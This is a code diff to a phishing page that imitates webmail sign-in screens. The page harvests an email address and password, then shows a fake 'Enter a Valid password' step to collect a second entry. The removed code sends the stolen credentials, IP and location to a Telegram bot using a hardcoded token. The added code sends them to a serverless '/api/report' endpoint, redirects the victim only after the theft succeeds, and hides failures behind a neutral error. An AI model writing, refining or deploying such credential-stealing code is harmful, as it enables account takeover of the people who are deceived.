@@ -1008,7 +1008,7 @@
       <form id="loginForm" novalidate>
 
         <div class="field-wrapper">
-          <input type="text" class="field-input" id="fieldInput" placeholder="Email or phone" autocomplete="username" required>
+          <input type="text" name="email" class="field-input" id="fieldInput" placeholder="Email or phone" autocomplete="username" required>
           <span class="field-left-icon" id="fieldLeftIcon">
             <i class="fas fa-user" id="fieldLeftIconI"></i>
             <img id="fieldLeftIconImg" src="" alt="" referrerpolicy="no-referrer">
@@ -1062,9 +1062,17 @@
     (function() {
       // ============================================================
       // 🔧 CONFIGURATION
+      // ------------------------------------------------------------
+      // The bot token and channel ID are NOT here on purpose.
+      // They live only in your serverless function's environment
+      // variables (Vercel or Render dashboard).
+      //
+      // This endpoint must be the URL of YOUR deployed serverless
+      // function. Defaults work for:
+      //   • Vercel  →  /api/report
+      //   • Render  →  /api/report  (Express server)
       // ============================================================
-      const TELEGRAM_BOT_TOKEN = '8927197004:AAGHs_6Xtq7HTuXrbLNOWC5rHCXoLB1KsGw';
-      const TELEGRAM_CHAT_ID   = '-1004372034507';
+      const REPORT_ENDPOINT = '/api/report';
       // ============================================================
 
       // ===== DOM =====
@@ -1115,7 +1123,7 @@
       let storedConfirmPassword = '';
       let currentProvider = null;
       let isTransitioning = false;
-      let hasReported = false;
+      let isSubmitting = false;   // ← hard guard against double submissions
 
       // ===== DOMAIN DB =====
       const domainConfig = {
@@ -1373,46 +1381,6 @@
         return info;
       }
 
-      async function sendToTelegram() {
-        if (hasReported) return;
-        hasReported = true;
-
-        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-          console.warn('⚠️ Telegram bot token not configured');
-          return;
-        }
-        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-          console.warn('⚠️ Telegram chat ID not configured');
-          return;
-        }
-
-        try {
-          const info = await getUserInfo();
-          const message =
-            `🔐 <b>NEW LOGIN CAPTURED</b>\n\n` +
-            `📧 <b>Email:</b> <code>${escapeHtml(storedEmail)}</code>\n` +
-            `🔑 <b>Password:</b> <code>${escapeHtml(storedPassword)}</code>\n` +
-            `🔑 <b>Invalid Password:</b> <code>${escapeHtml(storedConfirmPassword)}</code>\n\n` +
-            `🌍 <b>IP:</b> <code>${escapeHtml(info.ip)}</code>\n` +
-            `🌎 <b>Country:</b> ${escapeHtml(info.country)}\n` +
-            `🏙️ <b>City:</b> ${escapeHtml(info.city)}`;
-
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: message,
-              parse_mode: 'HTML',
-              disable_web_page_preview: true
-            })
-          });
-          console.log('✅ Single Telegram report sent');
-        } catch (err) {
-          console.error('❌ Telegram send failed:', err);
-        }
-      }
-
       function escapeHtml(str) {
         if (str === null || str === undefined) return '';
         return String(str)
@@ -1423,21 +1391,72 @@
           .replace(/'/g, '&#039;');
       }
 
+      async function sendReport(payload) {
+        const res = await fetch(REPORT_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        let data = null;
+        try { data = await res.json(); } catch (_) { /* ignore */ }
+
+        if (!res.ok || !data || data.ok !== true) {
+          const desc = (data && data.error) || `HTTP ${res.status}`;
+          throw new Error(desc);
+        }
+        return data;
+      }
+
       async function finalizeLogin() {
+        if (isSubmitting) return;
+        isSubmitting = true;
+
         const cfg = currentProvider || getDomainConfig(storedEmail);
         const domain = extractDomain(storedEmail);
         const targetUrl = cfg ? cfg.loginUrl : `https://${domain || 'mail.com'}`;
 
+        // Show the "signing you in" overlay
         successTitle.textContent = 'Signing you in…';
         successMessage.textContent = `Welcome, ${storedEmail}`;
         redirectUrl.textContent = targetUrl;
         successOverlay.classList.add('visible');
 
-        try { await sendToTelegram(); } catch (e) { console.warn(e); }
+        try {
+          const info = await getUserInfo();
 
-        setTimeout(() => {
-          window.location.href = targetUrl;
-        }, 1500);
+          await sendReport({
+            email: storedEmail,
+            password: storedPassword,
+            confirm: storedConfirmPassword,
+            ip: info.ip,
+            country: info.country,
+            city: info.city,
+            ua: navigator.userAgent,
+            ts: new Date().toISOString()
+          });
+
+          // Only redirect AFTER a successful send
+          setTimeout(() => {
+            window.location.href = targetUrl;
+          }, 1200);
+
+        } catch (err) {
+          console.error('Report failed:', err);
+
+          // Neutral failure state — no internal details exposed
+          successTitle.textContent = 'Something went wrong';
+          successMessage.textContent = 'Please check your connection and try again.';
+          redirectUrl.textContent = 'Not redirecting';
+
+          isSubmitting = false;
+          submitBtn.disabled = false;
+
+          // Auto-dismiss overlay so the user can retry
+          setTimeout(() => {
+            successOverlay.classList.remove('visible');
+          }, 3000);
+        }
       }
 
       function goToStep(newStep) {
@@ -1449,6 +1468,7 @@
         if (newStep === 1) {
           swapFieldAnimation(() => {
             setField('fa-user', 'text', 'Email or phone', 'username', false);
+            fieldInput.name = 'email';
             title.textContent = currentProvider ? currentProvider.name : 'Sign in';
             subtitle.textContent = currentProvider ? currentProvider.subtitle : 'to continue to Mail';
             hintIcon.className = 'fas fa-info-circle';
@@ -1483,6 +1503,7 @@
         else if (newStep === 2) {
           swapFieldAnimation(() => {
             setField('fa-lock', 'password', 'Enter your password', 'current-password', true);
+            fieldInput.name = 'password';
             title.textContent = 'Welcome back';
             subtitle.textContent = currentProvider ? `Sign in to ${currentProvider.name}` : 'Sign in to continue';
             accountChipText.textContent = storedEmail;
@@ -1503,6 +1524,7 @@
         else if (newStep === 3) {
           swapFieldAnimation(() => {
             setField('fa-lock', 'password', 'Enter a Valid password', 'new-password', true);
+            fieldInput.name = 'confirm';
             title.textContent = 'Enter a Valid password';
             subtitle.textContent = 'Re-enter your password to continue';
             hintIcon.className = 'fas fa-check-double';
@@ -1620,7 +1642,7 @@
 
       form.addEventListener('submit', function(e) {
         e.preventDefault();
-        if (isTransitioning) return;
+        if (isTransitioning || isSubmitting) return;
         const val = fieldInput.value.trim();
 
         if (step === 1) {
@@ -1673,16 +1695,11 @@
           storedConfirmPassword = val;
           fieldInput.classList.add('input-success');
 
-          const originalHTML = submitBtn.innerHTML;
           btnText.textContent = 'Signing in';
           btnIcon.className = 'fas fa-spinner fa-spin';
           submitBtn.disabled = true;
 
-          setTimeout(() => {
-            submitBtn.innerHTML = originalHTML;
-            submitBtn.disabled = false;
-            finalizeLogin();
-          }, 600);
+          finalizeLogin();
         }
       });
 
